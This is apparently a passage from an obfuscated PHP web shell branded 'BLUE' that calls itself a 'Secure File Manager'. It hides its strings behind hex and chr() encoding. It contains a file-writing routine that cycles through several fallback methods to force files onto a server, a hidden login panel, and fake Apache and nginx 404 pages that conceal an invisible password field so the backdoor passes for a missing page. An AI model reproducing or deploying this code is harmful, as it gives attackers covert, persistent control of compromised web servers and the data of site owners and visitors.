    $_e20d26 = realpath($_d69e7c);
    if ($_6c61b9 === false || $_e20d26 === false)
        return null;
    $_6c61b9 = rtrim(str_replace("\x5c", "\x2f", $_6c61b9), chr(47));
    $_e20d26 = str_replace("\x5c", "\x2f", $_e20d26);
    if ($_e20d26 === $_6c61b9) {
        $_6a27f4 = "";
    } elseif (strpos($_e20d26, $_6c61b9 . "\x2f") === 0) {
        $_6a27f4 = substr($_e20d26, strlen($_6c61b9) + 1);
    } else {
        return null;
    }
    $_b6b8f4 = (!empty($_SERVER[chr(72).chr(84).chr(84).chr(80).chr(83)]) && $_SERVER[chr(72).chr(84).chr(84).chr(80).chr(83)] !== "\x6f\x66\x66") ? "\x68\x74\x74\x70\x73" : "\x68\x74\x74\x70";
    $_04b4e8 = isset($_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(72).chr(79).chr(83).chr(84)]) ? $_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(72).chr(79).chr(83).chr(84)] : chr(108).chr(111).chr(99).chr(97).chr(108).chr(104).chr(111).chr(115).chr(116);
    $_ad148b = array_map("\x72\x61\x77\x75\x72\x6c\x65\x6e\x63\x6f\x64\x65", explode(chr(47), $_6a27f4));
    return $_b6b8f4 . "\x3a\x2f\x2f" . $_04b4e8 . "\x2f" . implode(chr(47), $_ad148b);
}
function _fbaa772a9()
{
    if ($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(77).chr(69).chr(84).chr(72).chr(79).chr(68)] === "\x50\x4f\x53\x54") {
        $_89f0c3 = isset($_SESSION["\x63\x73\x72\x66"]) ? $_SESSION[chr(99).chr(115).chr(114).chr(102)] : "";
        $_2c3b8c = isset($_POST["\x63\x73\x72\x66"]) ? (string)$_POST[chr(99).chr(115).chr(114).chr(102)] : "";
        $_f10de9 = hash_equals($_89f0c3, $_2c3b8c);
        if (!$_f10de9) {
            http_response_code(400);
            exit(chr(67).chr(83).chr(82).chr(70).chr(32).chr(116).chr(111).chr(107).chr(101).chr(110).chr(32).chr(105).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100));
        }
    }
}


function _f9ec8a008($_a1c28d, $_e48ffb = null)
{
    $_dd52c4 = chr(67).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100).chr(32).chr(98).chr(121).chr(32).chr(66).chr(76).chr(85).chr(69).chr(32).chr(64).chr(32) . date(chr(99)) . "\x0a";
    $_6cacf0 = (string)($_e48ffb !== null ? $_e48ffb : $_dd52c4);
    if ($_6cacf0 === '')
        $_6cacf0 = $_dd52c4;

    $_0980b5 = @file_put_contents($_a1c28d, $_6cacf0, LOCK_EX);
    if ($_0980b5 !== false && $_0980b5 > 0)
        return array(true, "\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73");

    $_a9dce0 = @fopen($_a1c28d, chr(119).chr(98));
    if ($_a9dce0) {
        $_e3178d = @fwrite($_a9dce0, $_6cacf0);
        @fclose($_a9dce0);
        if ($_e3178d !== false && $_e3178d > 0)
            return array(true, "\x66\x6f\x70\x65\x6e\x2b\x66\x77\x72\x69\x74\x65");
    }

    $_c91b42 = @tempnam(sys_get_temp_dir(), "\x62\x6c\x75\x65\x5f");
    if ($_c91b42) {
        @file_put_contents($_c91b42, $_6cacf0);
        if (@rename($_c91b42, $_a1c28d)) {
            if (@filesize($_a1c28d) > 0)
                return array(true, "\x74\x65\x6d\x70\x6e\x61\x6d\x2b\x72\x65\x6e\x61\x6d\x65");
        }
        elseif (@copy($_c91b42, $_a1c28d)) {
            @unlink($_c91b42);
            if (@filesize($_a1c28d) > 0)
                return array(true, chr(116).chr(101).chr(109).chr(112).chr(110).chr(97).chr(109).chr(43).chr(99).chr(111).chr(112).chr(121));
        }
        @unlink($_c91b42);
    }

    $_c2e830 = @fopen("\x70\x68\x70\x3a\x2f\x2f\x74\x65\x6d\x70", chr(119).chr(98).chr(43));
    if ($_c2e830) {
        @fwrite($_c2e830, $_6cacf0);
        @rewind($_c2e830);
        $_15eb26 = @fopen($_a1c28d, chr(119).chr(98));
        if ($_15eb26) {
            $_34d72e = @stream_copy_to_stream($_c2e830, $_15eb26);
            @fclose($_15eb26);
            if ($_34d72e !== false && $_34d72e > 0) {
                @fclose($_c2e830);
                return array(true, chr(112).chr(104).chr(112).chr(58).chr(47).chr(47).chr(116).chr(101).chr(109).chr(112).chr(32).chr(99).chr(111).chr(112).chr(121));
            }
        }
        @fclose($_c2e830);
    }

    if (@touch($_a1c28d)) {
        $_de5ccd = @file_put_contents($_a1c28d, $_6cacf0, FILE_APPEND);
        if ($_de5ccd !== false && $_de5ccd > 0)
            return array(true, chr(116).chr(111).chr(117).chr(99).chr(104).chr(43).chr(97).chr(112).chr(112).chr(101).chr(110).chr(100));
    }

    return array(false, "\x41\x6c\x6c\x20\x6d\x65\x74\x68\x6f\x64\x73\x20\x66\x61\x69\x6c\x65\x64");
}


function _f757b5aa5($_0a97e3 = "")
{
    $_9e5755 = isset($_SESSION["\x63\x73\x72\x66"]) ? $_SESSION["\x63\x73\x72\x66"] : "";
?>
    <!doctype html><html lang="en" class="dark"><head>
    <meta charset="utf-8"><title>BLUE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
    <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>tailwind.config={theme:{extend:{fontFamily:{ui:['Ubuntu','ui-sans-serif','system-ui','Segoe UI','Roboto','Helvetica Neue','Arial','Noto Sans']},colors:{canvas:{DEFAULT:'#0b1220',surface:'rgba(15,23,42,.8)'}},boxShadow:{soft:'0 10px 30px rgba(0,0,0,.45)',card:'0 6px 20px rgba(37,99,235,.22)'},borderRadius:{xl2:'18px'}}},darkMode:'class'}</script>
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link href="https://www.svgrepo.com/show/475654/github-color.svg" rel="icon">
    <style>
        :root{color-scheme:dark} html,body{height:100%}
        body{font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";}
        .shell{min-height:100vh;background:radial-gradient(1200px 600px at 20% -10%, rgba(59,130,246,.15), transparent 60%), radial-gradient(900px 500px at 90% 0%, rgba(168,85,247,.12), transparent 60%), #0b1220; display:flex;align-items:center;justify-content:center;}
        .card{background:rgba(15,23,42,.8);border:1px solid rgba(148,163,184,.15);border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.03);backdrop-filter:blur(8px);}
        .btn{background:linear-gradient(180deg,#3b82f6,#2563eb);color:#eaf2ff;border-radius:12px;padding:.7rem 1rem;font-weight:700;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 6px 20px rgba(37,99,235,.25);}
        .btn:hover{filter:brightness(1.05);box-shadow:0 10px 26px rgba(37,99,235,.35)} .btn:active{transform:translateY(.5px)}
        .field{border:1px solid rgba(148,163,184,.18);border-radius:12px;padding:.6rem .8rem;width:100%;background:#0b1220;color:#e5e7eb;}
        .field:focus{outline:none;box-shadow:0 0 0 4px rgba(59,130,246,.25);border-color:#3b82f6}
        .title{background:linear-gradient(90deg,#93c5fd,#c4b5fd);-webkit-background-clip:text;background-clip:text;color:transparent}
    </style>
</head><body class="shell text-slate-100">
<div class="w-full max-w-md card p-6">
    <div class="mb-5 flex items-center justify-between">
        <div class="text-xl font-bold tracking-tight title">BLUE</div>
        <span class="text-xs text-slate-400">PHP <?php echo h(PHP_VERSION); ?></span>
    </div>
    <?php if ($_0a97e3): ?><div class="mb-3 rounded-lg border border-red-900/60 bg-red-900/30 text-red-100 px-3 py-2"><?php echo h($_0a97e3); ?></div><?php
    endif; ?>
    <form method="post" action="?a=login" class="space-y-3">
        <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
        <div><label class="text-sm text-slate-300">Username</label><input class="field mt-1" name="user" type="text" autocomplete="username" required></div>
        <div><label class="text-sm text-slate-300">Password</label><input class="field mt-1" name="pass" type="password" autocomplete="current-password" required></div>
        <button class="btn w-full" type="submit">Login</button>
    </form>
    <p class="text-[12px] text-slate-400 mt-4 text-center">© BLUE x Secure File Manager</p>
</div>
</body></html><?php
}

function _f3c2eb82b()
{
    $_a21e63 = isset($_SERVER[chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(83).chr(79).chr(70).chr(84).chr(87).chr(65).chr(82).chr(69)]) ? strtolower((string)$_SERVER[chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(83).chr(79).chr(70).chr(84).chr(87).chr(65).chr(82).chr(69)]) : "";
    if (strpos($_a21e63, "\x6e\x67\x69\x6e\x78") !== false)
        return chr(110).chr(103).chr(105).chr(110).chr(120);
    if (strpos($_a21e63, "\x61\x70\x61\x63\x68\x65") !== false)
        return "\x61\x70\x61\x63\x68\x65";
    return chr(97).chr(112).chr(97).chr(99).chr(104).chr(101);
}

function _fc64c8d43()
{
    $_9e5755 = isset($_SESSION[chr(99).chr(115).chr(114).chr(102)]) ? $_SESSION["\x63\x73\x72\x66"] : "";
    $_04b4e8 = isset($_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(72).chr(79).chr(83).chr(84)]) ? h($_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(72).chr(79).chr(83).chr(84)]) : chr(108).chr(111).chr(99).chr(97).chr(108).chr(104).chr(111).chr(115).chr(116);
    $_a1cc92  = isset($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(85).chr(82).chr(73)]) ? h($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(85).chr(82).chr(73)]) : chr(47);
    http_response_code(404);
?><!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL <?php echo $_a1cc92; ?> was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at <?php echo $_04b4e8; ?> Port 80</address>
<form method="post" action="?a=404pass" style="margin:0;padding:0;">
    <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
    <input type="password" name="pass" id="hpass"
           style="position:fixed;opacity:0;width:1px;height:1px;top:0;left:0;border:none;outline:none;padding:0;margin:0;pointer-events:auto;"
           autocomplete="new-password" tabindex="-1" aria-hidden="true">
</form>
<script>
(function(){
    var f=document.getElementById('hpass');
    document.addEventListener('click',function(e){if(e.target!==f)f.focus();});
    f.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();this.closest('form').submit();}});
})();
</script>
</body></html><?php
}

function _f874945aa()
{
    $_9e5755 = isset($_SESSION[chr(99).chr(115).chr(114).chr(102)]) ? $_SESSION["\x63\x73\x72\x66"] : "";
    http_response_code(404);
?><!DOCTYPE html>
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
<form method="post" action="?a=404pass" style="margin:0;padding:0;">
    <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
    <input type="password" name="pass" id="hpass"
           style="position:fixed;opacity:0;width:1px;height:1px;top:0;left:0;border:none;outline:none;padding:0;margin:0;pointer-events:auto;"
           autocomplete="new-password" tabindex="-1" aria-hidden="true">
</form>
<script>
(function(){
    var f=document.getElementById('hpass');
    document.addEventListener('click',function(e){if(e.target!==f)f.focus();});
    f.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();this.closest('form').submit();}});
})();
</script>
</body>
</html><?php
}

function _f7220854a()
{
    if (_f3c2eb82b() === chr(110).chr(103).chr(105).chr(110).chr(120))
        _f874945aa();
    else
        _fc64c8d43();
}

function _f2d3fa2ee($_521aa5, $_8aaa95)
{
    if (is_fn_usable("\x70\x61\x73\x73\x77\x6f\x72\x64\x5f\x76\x65\x72\x69\x66\x79"))
        return password_verify($_521aa5, $_8aaa95);
    if (strlen($_8aaa95) >= 60 && ($_8aaa95[0] . $_8aaa95[1]) === "\x24\x32")
        return crypt($_521aa5, $_8aaa95) === $_8aaa95;
    return false;
}
function _f6f31fc12($_a5838a, $_60dcf7)
{
    if ($_a5838a !== AUTH_USER)
        return false;
    $_8aaa95 = AUTH_PASS_HASH;
    if ($_8aaa95 === '' || strlen($_8aaa95) < 20)
        return false;
    return _f2d3fa2ee($_60dcf7, $_8aaa95);
}


function _f9c42d19e($_201cba, $_35d7e8 = "\x69\x63\x6f")
{
    $_85ae2d = array(
        "\x66\x6f\x6c\x64\x65\x72" => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(50).chr(52).chr(32).chr(50).chr(52).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_35d7e8 . "\x22\x20\x61\x72\x69\x61\x2d\x68\x69\x64\x64\x65\x6e\x3d\x22\x74\x72\x75\x65\x22\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x31\x30\x20\x34\x6c\x32\x20\x32\x68\x36\x61\x32\x20\x32\x20\x30\x20\x30\x31\x32\x20\x32\x76\x31\x48\x34\x56\x36\x61\x32\x20\x32\x20\x30\x20\x30\x31\x32\x2d\x32\x68\x34\x7a\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x6f\x70\x61\x63\x69\x74\x79\x3d\x22\x2e\x31\x32\x22\x2f\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x33\x20\x39\x68\x31\x38\x76\x39\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x20\x32\x48\x35\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x2d\x32\x56\x39\x7a\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x2f\x3e\x3c\x2f\x73\x76\x67\x3e",
        chr(102).chr(105).chr(108).chr(101) => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(50).chr(52).chr(32).chr(50).chr(52).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_35d7e8 . "\x22\x20\x61\x72\x69\x61\x2d\x68\x69\x64\x64\x65\x6e\x3d\x22\x74\x72\x75\x65\x22\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x36\x20\x33\x68\x37\x6c\x35\x20\x35\x76\x31\x31\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x20\x32\x48\x36\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x2d\x32\x56\x35\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x6f\x70\x61\x63\x69\x74\x79\x3d\x22\x2e\x31\x32\x22\x2f\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x31\x33\x20\x33\x76\x35\x61\x32\x20\x32\x20\x30\x20\x30\x30\x32\x20\x32\x68\x35\x22\x20\x66\x69\x6c\x6c\x3d\x22\x6e\x6f\x6e\x65\x22\x20\x73\x74\x72\x6f\x6b\x65\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x77\x69\x64\x74\x68\x3d\x22\x32\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x6c\x69\x6e\x65\x6a\x6f\x69\x6e\x3d\x22\x72\x6f\x75\x6e\x64\x22\x2f\x3e\x3c\x2f\x73\x76\x67\x3e",
        "\x63\x6f\x64\x65" => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(50).chr(52).chr(32).chr(50).chr(52).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_35d7e8 . "\x22\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x38\x20\x31\x36\x6c\x2d\x34\x2d\x34\x20\x34\x2d\x34\x4d\x31\x36\x20\x38\x6c\x34\x20\x34\x2d\x34\x20\x34\x22\x20\x66\x69\x6c\x6c\x3d\x22\x6e\x6f\x6e\x65\x22\x20\x73\x74\x72\x6f\x6b\x65\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x77\x69\x64\x74\x68\x3d\x22\x32\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x6c\x69\x6e\x65\x63\x61\x70\x3d\x22\x72\x6f\x75\x6e\x64\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x6c\x69\x6e\x65\x6a\x6f\x69\x6e\x3d\x22\x72\x6f\x75\x6e\x64\x22\x2f\x3e\x3c\x2f\x73\x76\x67\x3e",
        "\x74\x65\x78\x74" => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x32\x34\x20\x32\x34\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_35d7e8 . chr(34).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(52).chr(32).chr(54).chr(104).chr(49).chr(54).chr(77).chr(52).chr(32).chr(49).chr(50).chr(104).chr(49).chr(54).chr(77).chr(52).chr(32).chr(49).chr(56).chr(104).chr(49).chr(48).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(110).chr(111).chr(110).chr(101).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(34).chr(50).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(108).chr(105).chr(110).chr(101).chr(99).chr(97).chr(112).chr(61).chr(34).chr(114).chr(111).chr(117).chr(110).chr(100).chr(34).chr(47).chr(62).chr(60).chr(47).chr(115).chr(118).chr(103).chr(62),
        chr(112).chr(119).chr(120) => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x34\x38\x20\x34\x38\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_35d7e8 . chr(34).chr(32).chr(97).chr(114).chr(105).chr(97).chr(45).chr(104).chr(105).chr(100).chr(100).chr(101).chr(110).chr(61).chr(34).chr(116).chr(114).chr(117).chr(101).chr(34).chr(32).chr(120).chr(109).chr(108).chr(110).chr(115).chr(61).chr(34).chr(104).chr(116).chr(116).chr(112).chr(58).chr(47).chr(47).chr(119).chr(119).chr(119).chr(46).chr(119).chr(51).chr(46).chr(111).chr(114).chr(103).chr(47).chr(50).chr(48).chr(48).chr(48).chr(47).chr(115).chr(118).chr(103).chr(34).chr(62).chr(60).chr(103).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(62).chr(60).chr(103).chr(32).chr(116).chr(114).chr(97).chr(110).chr(115).chr(102).chr(111).chr(114).chr(109).chr(61).chr(34).chr(116).chr(114).chr(97).chr(110).chr(115).chr(108).chr(97).chr(116).chr(101).chr(40).chr(45).chr(55).chr(48).chr(48).chr(32).chr(45).chr(53).chr(54).chr(48).chr(41).chr(34).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(55).chr(50).chr(51).chr(46).chr(57).chr(57).chr(56).chr(53).chr(44).chr(53).chr(54).chr(48).chr(32).chr(67).chr(55).chr(49).chr(48).chr(46).chr(55).chr(52).chr(54).chr(44).chr(53).chr(54).chr(48).chr(32).chr(55).chr(48).chr(48).chr(44).chr(53).chr(55).chr(48).chr(46).chr(55).chr(56).chr(55).chr(48).chr(57).chr(50).chr(32).chr(55).chr(48).chr(48).chr(44).chr(53).chr(56).chr(52).chr(46).chr(48).chr(57).chr(54).chr(54).chr(52).chr(52).chr(32).chr(67).chr(55).chr(48).chr(48).chr(44).chr(53).chr(57).chr(52).chr(46).chr(55).chr(52).chr(48).chr(54).chr(55).chr(49).chr(32).chr(55).chr(48).chr(54).chr(46).chr(56).chr(55).chr(54).chr(44).chr(54).chr(48).chr(51).chr(46).chr(55).chr(55).chr(49).chr(56).chr(51).chr(32).chr(55).chr(49).chr(54).chr(46).chr(52).chr(49).chr(52).chr(53).chr(44).chr(54).chr(48).chr(54).chr(46).chr(57).chr(53).chr(56).chr(52).chr(49).chr(50).chr(32).chr(67).chr(55).chr(49).chr(55).chr(46).chr(54).chr(49).chr(52).chr(53).chr(44).chr(54).chr(48).chr(55).chr(46).chr(49).chr(55).chr(57).chr(55).chr(56).chr(54).chr(32).chr(55).chr(49).chr(56).chr(46).chr(48).chr(53).chr(50).chr(53).chr(44).chr(54).chr(48).chr(54).chr(46).chr(52).chr(51).chr(53).chr(56).chr(52).chr(57).chr(32).chr(55).chr(49).chr(56).chr(46).chr(48).chr(53).chr(50).chr(53).chr(44).chr(54).chr(48).chr(53).chr(46).chr(55).chr(57).chr(55).chr(51).chr(50).chr(56).chr(32).chr(67).chr(55).chr(49).chr(56).chr(46).chr(48).chr(53).chr(50).chr(53).chr(44).chr(54).chr(48).chr(53).chr(46).chr(50).chr(50).chr(53).chr(48).chr(54).chr(56).chr(32).chr(55).chr(49).chr(56).chr(46).chr(48).chr(51).chr(49).chr(53).chr(44).chr(54).chr(48).chr(51).chr(46).chr(55).chr(49).chr(48).chr(48).chr(56).chr(54).chr(32).chr(55).chr(49).chr(56).chr(46).chr(48).chr(49).chr(57).chr(53).chr(44).chr(54).chr(48).chr(49).chr(46).chr(54).chr(57).chr(57).chr(54).chr(52).chr(56).chr(32).chr(67).chr(55).chr(49).chr(49).chr(46).chr(51).chr(52).chr(51).chr(44).chr(54).chr(48).chr(51).chr(46).chr(49).chr(53).chr(53).chr(56).chr(57).chr(56).chr(32).chr(55).chr(48).chr(57).chr(46).chr(57).chr(51).chr(52).chr(53).chr(44).chr(53).chr(57).chr(56).chr(46).chr(52).chr(54).chr(57).chr(51).chr(57).chr(52).chr(32).chr(55).chr(48).chr(57).chr(46).chr(57).chr(51).chr(52).chr(53).chr(44).chr(53).chr(57).chr(56).chr(46).chr(52).chr(54).chr(57).chr(51).chr(57).chr(52).chr(32).chr(67).chr(55).chr(48).chr(56).chr(46).chr(56).chr(52).chr(52).chr(44).chr(53).chr(57).chr(53).chr(46).chr(54).chr(56).chr(54).chr(52).chr(48).chr(53).chr(32).chr(55).chr(48).chr(55).chr(46).chr(50).chr(55).chr(48).chr(53).chr(44).chr(53).chr(57).chr(52).chr(46).chr(57).chr(52).chr(53).chr(52).chr(56).chr(32).chr(55).chr(48).chr(55).chr(46).chr(50).chr(55).chr(48).chr(53).chr(44).chr(53).chr(57).chr(52).chr(46).chr(57).chr(52).chr(53).chr(52).chr(56).chr(32).chr(67).chr(55).chr(48).chr(53).chr(46).chr(48).chr(57).chr(49).chr(44).chr(53).chr(57).chr(51).chr(46).chr(52).chr(53).chr(48).chr(48).chr(55).chr(53).chr(32).chr(55).chr(48).chr(55).chr(46).chr(52).chr(51).chr(53).chr(53).chr(44).chr(53).chr(57).chr(51).chr(46).chr(52).chr(56).chr(48).chr(49).chr(57).chr(52).chr(32).chr(55).chr(48).chr(55).chr(46).chr(52).chr(51).chr(53).chr(53).chr(44).chr(53).chr(57).chr(51).chr(46).chr(52).chr(56).chr(48).chr(49).chr(57).chr(52).chr(32).chr(67).chr(55).chr(48).chr(57).chr(46).chr(56).chr(52).chr(51).chr(44).chr(53).chr(57).chr(51).chr(46).chr(54).chr(53).chr(48).chr(51).chr(54).chr(54).chr(32).chr(55).chr(49).chr(49).chr(46).chr(49).chr(49).chr(48).chr(53).chr(44).chr(53).chr(57).chr(53).chr(46).chr(57).chr(54).chr(51).chr(52).chr(57).chr(57).chr(32).chr(55).chr(49).chr(49).chr(46).chr(49).chr(49).chr(48).chr(53).chr(44).chr(53).chr(57).chr(53).chr(46).chr(57).chr(54).chr(51).chr(52).chr(57).chr(57).chr(32).chr(67).chr(55).chr(49).chr(51).chr(46).chr(50).chr(53).chr(50).chr(53).chr(44).chr(53).chr(57).chr(57).chr(46).chr(54).chr(52).chr(53).chr(53).chr(51).chr(56).chr(32).chr(55).chr(49).chr(54).chr(46).chr(55).chr(50).chr(56).chr(44).chr(53).chr(57).chr(56).chr(46).chr(53).chr(56).chr(50).chr(51).chr(52).chr(32).chr(55).chr(49).chr(56).chr(46).chr(48).chr(57).chr(54).chr(44).chr(53).chr(57).chr(55).chr(46).chr(57).chr(54).chr(52).chr(57).chr(48).chr(50).chr(32).chr(67).chr(55).chr(49).chr(56).chr(46).chr(51).chr(49).chr(51).chr(53).chr(44).chr(53).chr(57).chr(54).chr(46).chr(52).chr(48).chr(55).chr(55).chr(53).chr(52).chr(32).chr(55).chr(49).chr(56).chr(46).chr(57).chr(51).chr(52).chr(53).chr(44).chr(53).chr(57).chr(53).chr(46).chr(51).chr(52).chr(54).chr(48).chr(54).chr(50).chr(32).chr(55).chr(49).chr(57).chr(46).chr(54).chr(50).chr(44).chr(53).chr(57).chr(52).chr(46).chr(55).chr(52).chr(51).chr(54).chr(56).chr(51).chr(32).chr(67).chr(55).chr(49).chr(52).chr(46).chr(50).chr(57).chr(48).chr(53).chr(44).chr(53).chr(57).chr(52).chr(46).chr(49).chr(51).chr(53).chr(50).chr(56).chr(49).chr(32).chr(55).chr(48).chr(56).chr(46).chr(54).chr(56).chr(56).chr(44).chr(53).chr(57).chr(50).chr(46).chr(48).chr(54).chr(57).chr(49).chr(50).chr(51).chr(32).chr(55).chr(48).chr(56).chr(46).chr(54).chr(56).chr(56).chr(44).chr(53).chr(56).chr(50).chr(46).chr(56).chr(51).chr(54).chr(49).chr(54).chr(55).chr(32).chr(67).chr(55).chr(48).chr(56).chr(46).chr(54).chr(56).chr(56).chr(44).chr(53).chr(56).chr(48).chr(46).chr(50).chr(48).chr(53).chr(50).chr(55).chr(57).chr(32).chr(55).chr(48).chr(57).chr(46).chr(54).chr(50).chr(50).chr(53).chr(44).chr(53).chr(55).chr(56).chr(46).chr(48).chr(53).chr(52).chr(55).chr(56).chr(56).chr(32).chr(55).chr(49).chr(49).chr(46).chr(49).chr(53).chr(56).chr(53).chr(44).chr(53).chr(55).chr(54).chr(46).chr(51).chr(54).chr(57).chr(54).chr(51).chr(52).chr(32).chr(67).chr(55).chr(49).chr(48).chr(46).chr(57).chr(49).chr(49).chr(44).chr(53).chr(55).chr(53).chr(46).chr(55).chr(53).chr(57).chr(55).chr(50).chr(54).chr(32).chr(55).chr(49).chr(48).chr(46).chr(48).chr(56).chr(55).chr(53).chr(44).chr(53).chr(55).chr(51).chr(46).chr(51).chr(49).chr(49).chr(48).chr(53).chr(56).chr(32).chr(55).chr(49).chr(49).chr(46).chr(51).chr(57).chr(50).chr(53).chr(44).chr(53).chr(54).chr(57).chr(46).chr(57).chr(57).chr(51).chr(52).chr(53).chr(56).chr(32).chr(67).chr(55).chr(49).chr(49).chr(46).chr(51).chr(57).chr(50).chr(53).chr(44).chr(53).chr(54).chr(57).chr(46).chr(57).chr(57).chr(51).chr(52).chr(53).chr(56).chr(32).chr(55).chr(49).chr(51).chr(46).chr(52).chr(48).chr(56).chr(53).chr(44).chr(53).chr(54).chr(57).chr(46).chr(51).chr(52).chr(53).chr(57).chr(48).chr(50).chr(32).chr(55).chr(49).chr(55).chr(46).chr(57).chr(57).chr(50).chr(53).chr(44).chr(53).chr(55).chr(50).chr(46).chr(52).chr(54).chr(51).chr(50).chr(49).chr(32).chr(67).chr(55).chr(49).chr(57).chr(46).chr(57).chr(48).chr(56).chr(44).chr(53).chr(55).chr(49).chr(46).chr(57).chr(50).chr(56).chr(53).chr(57).chr(57).chr(32).chr(55).chr(50).chr(49).chr(46).chr(57).chr(54).chr(44).chr(53).chr(55).chr(49).chr(46).chr(54).chr(54).chr(50).chr(48).chr(52).chr(55).chr(32).chr(55).chr(50).chr(52).chr(46).chr(48).chr(48).chr(49).chr(53).chr(44).chr(53).chr(55).chr(49).chr(46).chr(54).chr(53).chr(49).chr(53).chr(48).chr(53).chr(32).chr(67).chr(55).chr(50).chr(54).chr(46).chr(48).chr(52).chr(44).chr(53).chr(55).chr(49).chr(46).chr(54).chr(54).chr(50).chr(48).chr(52).chr(55).chr(32).chr(55).chr(50).chr(56).chr(46).chr(48).chr(57).chr(51).chr(53).chr(44).chr(53).chr(55).chr(49).chr(46).chr(57).chr(50).chr(56).chr(53).chr(57).chr(57).chr(32).chr(55).chr(51).chr(48).chr(46).chr(48).chr(49).chr(48).chr(53).chr(44).chr(53).chr(55).chr(50).chr(46).chr(52).chr(